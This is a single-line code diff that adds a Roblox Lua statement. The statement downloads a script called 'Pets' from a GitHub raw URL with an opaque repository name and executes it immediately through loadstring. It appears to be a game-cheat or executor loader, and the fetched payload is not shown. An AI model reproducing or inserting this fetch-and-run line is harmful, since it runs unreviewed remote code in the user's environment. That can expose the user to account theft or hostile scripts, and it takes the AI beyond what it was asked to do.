@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/jd5ag73s9bwk/refs/heads/main/Pets"))()
